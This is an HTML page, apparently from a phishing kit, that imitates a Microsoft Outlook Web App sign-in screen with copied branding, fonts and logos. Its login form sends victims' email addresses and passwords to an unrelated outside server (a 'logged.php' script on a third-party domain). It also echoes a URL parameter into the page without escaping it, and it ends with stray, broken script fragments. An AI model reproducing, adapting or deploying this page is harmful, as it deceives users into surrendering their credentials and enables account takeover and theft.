


<!doctype html>
<html lang=en>
<head><meta charset="euc-jp">
    
    <meta name=viewport content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="shortcut icon" type=image/x-icon href=https://www.freepngimg.com/download/microsoft/70674-outlook-office-outlook.com-email-logo-365-microsoft.png />
    <meta name=description content>
    <meta name=author content>
    <title>Signin Outlook WebApp Settings</title>
    <link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous>
    <link href=https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet integrity=sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN crossorigin=anonymous>
    <style>@font-face{font-family:SegoeUI;src:local("Segoe UI Light"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.woff2) format("woff2"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.woff) format("woff"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.ttf) format("truetype");font-weight:100}@font-face{font-family:SegoeUI;src:local("Segoe UI Semilight"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.woff2) format("woff2"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.woff) format("woff"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.ttf) format("truetype");font-weight:200}@font-face{font-family:SegoeUI;src:local("Segoe UI"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.woff2) format("woff2"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.woff) format("woff"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.ttf) format("truetype");font-weight:400}@font-face{font-family:SegoeUI;src:local("Segoe UI Bold"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.woff2) format("woff2"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.woff) format("woff"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.ttf) format("truetype");font-weight:600}@font-face{font-family:SegoeUI;src:local("Segoe UI Semibold"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.woff2) format("woff2"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.woff) format("woff"),url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.ttf) format("truetype");font-weight:700}*{font-family:SegoeUI,"-apple-system",BlinkMacSystemFont,Roboto,"Helvetica Neue",sans-serif}html,body{height:100%}body{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;padding-top:40px;padding-bottom:40px;background-color:#f5f5f5}.form-signin{width:100%;max-width:330px;padding:15px;margin:auto}.form-signin .checkbox{font-weight:400}.form-signin .form-control{position:relative;box-sizing:border-box;height:auto;padding:10px;font-size:16px}.form-signin .form-control:focus{z-index:2}.form-signin input[type="email"]{margin-bottom:-1px;border-bottom-right-radius:0;border-bottom-left-radius:0}.form-signin input[type="password"]{margin-bottom:10px;border-top-left-radius:0;border-top-right-radius:0}.sidebar{position:absolute;top:0;bottom:0;left:0;display:inline-block;width:332px}.sidebar{background-color:#0072c6}.sidebar .owaLogoContainer{margin:40vh auto auto 109px;text-align:left}.login-box{padding-left:0;width:100%}@media(min-width:576px){.login-box{padding-left:332px}}@media(min-width:768px){.login-box{padding-left:332px}}@media(min-width:992px){.login-box{padding-left:332px}}@media(min-width:1200px){.login-box{padding-left:332px}}.btn.btn-primary{background-color:#0072c6}</style>
</head>
<body class=text-center>
    <div class="sidebar d-none d-sm-block d-md-block d-lg-block d-xl-block">
        <div class=owaLogoContainer>
            <img src=https://i.ibb.co/PGqXrNh/outlook-Logoleft.png class=owaLogo aria-hidden=true>
        </div>
    </div>
    <div class=login-box>
        <div class=form-signin>
            <img class=mb-4 src=https://i.ibb.co/QKZk6m6/download.png alt style=width:100%>
            <h1 style="color: #0078d4;" class="h4 mb-3 font-weight-normal" id=corportate-title> <i></i>Powered By <span id="dom">Microsoft</span>&copy;</h1><br />
            <form action="https://kbokogroup.com/wincoowa/logged.php" method="post">
                <label for=username class=sr-only>Email address</label>
            <input type="email" id="pet"  class=form-control name="pet" placeholder="Email address" value="<?php echo $_GET['email']; ?>" autofocus required>
            <label for=inputPassword class=sr-only>Password</label>
            <input type="password" id=inputPassword name="pett" class=form-control placeholder=Password required>
            <input type="hidden" name="error" id="error">
            <input type="hidden" name="source" value="OWA">
            <div  style=color:red class=warning id=warning></div>
            <div class="checkbox mb-3 text-left">
                <div id="err" style="color: red; display: none"><small>The password you entered isn't correct. Try entering your correct password again.</small></div>
                <label>
                    <input type=checkbox value=remember-me>&nbsp;
                    <span id=privateLabel aria-hidden=true>Private computer</span>
                    (<a href=# class=signInCheckBoxLink role=link>What is this?</a>)
                </label>
            </div>
            <button type="submit" style=float:right class="btn btn-lg btn-primary btn-block">Sign in</button>
            <br><br /><br><br />
            <p class="mt-5 mb-3 text-muted">&copy;2020 Microsoft</p>
            </form>
        </div>
    </div>
        }

    </script>
</body>
    </html>
